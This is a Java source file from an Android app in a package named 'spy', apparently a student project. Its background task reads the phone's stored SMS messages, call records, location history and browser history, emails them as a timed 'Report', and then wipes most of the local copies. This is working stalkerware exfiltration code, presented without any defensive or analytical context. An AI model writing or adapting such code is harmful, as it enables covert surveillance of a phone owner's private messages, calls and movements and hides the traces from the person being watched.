package edu.uj.jkordas.spy;

import java.util.Calendar;
import java.util.List;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import edu.uj.jkordas.spy.DAO.BrowserHistoryDataSource;
import edu.uj.jkordas.spy.DAO.CallDataSource;
import edu.uj.jkordas.spy.DAO.LocationDataSource;
import edu.uj.jkordas.spy.DAO.SmsDataSource;
import edu.uj.jkordas.spy.POJO.Call;
import edu.uj.jkordas.spy.POJO.Location;
import edu.uj.jkordas.spy.POJO.Sms;
import edu.uj.jkordas.spy.POJO.VisitedPage;


public class AsyncSendMail extends AsyncTask<Void, Void, Void> {

	private Context context;

	public AsyncSendMail(Context _context) {
		this.context = _context;
	}

	protected void onPostExecute() {
	}

	@Override
	protected Void doInBackground(Void... arg0) {
		Mail m = new Mail();
		int hour = Calendar.getInstance().get(Calendar.HOUR);
		int minute = Calendar.getInstance().get(Calendar.MINUTE);

		m.setSubject("Report on " + String.format("%02d", hour) + ":"
				+ String.format("%02d", minute));

		/*** SMS ***/
		SmsDataSource smsDatasource = new SmsDataSource(context);
		smsDatasource.open();
		List<Sms> smsList = smsDatasource.getAllSMS();
		smsDatasource.close();
		m.addContent("SMS", smsList.toString());

		/*** CALLS ***/
		CallDataSource callDatasource = new CallDataSource(context);
		callDatasource.open();
		List<Call> callList = callDatasource.getAllCalls();
		callDatasource.close();
		m.addContent("CALL", callList.toString());

		/*** LOCATION ***/
		LocationDataSource locationDatasource = new LocationDataSource(context);
		locationDatasource.open();
		List<Location> locationList = locationDatasource.getAllLocations();
		locationDatasource.close();
		m.addContent("LOCATION", locationList.toString());
		
		/*** BROWSER HISTORY ***/
		BrowserHistoryDataSource browserDatasource = new BrowserHistoryDataSource(context);
		browserDatasource.open();
		List<VisitedPage> visitedPageList = browserDatasource.getAllVisitedPages();
		browserDatasource.close();
		m.addContent("BROWSER HISTORY", visitedPageList.toString());

		try {
			// m.addAttachment(fileName);

			if (m.send()) {
				// log(, "Email was sent successfully.");
				clearAllTables();

			} else {
				// Logger.log(getApplicationContext(), "Email was  not sent.");
			}
		} catch (Exception e) {
			Log.e("MailApp", "Could not send email", e);
		}

		return null;
	}

	private void clearAllTables() {
		/** SMS **/
		SmsDataSource smsDatasource = new SmsDataSource(context);
		smsDatasource.open();
		smsDatasource.clearTable();
		smsDatasource.close();
		/*** CALLS ***/
		CallDataSource callDatasource = new CallDataSource(context);
		callDatasource.open();
		callDatasource.clearTable();
		callDatasource.close();
		/*** LOCATION ***/
		LocationDataSource locationDatasource = new LocationDataSource(context);
		locationDatasource.open();
		//locationDatasource.clearTable();
		locationDatasource.close();
		/*** BROWSER HISTORY ***/
		BrowserHistoryDataSource browserDatasource = new BrowserHistoryDataSource(context);
		browserDatasource.open();
		browserDatasource.clearTable();
		browserDatasource.close();
	}
}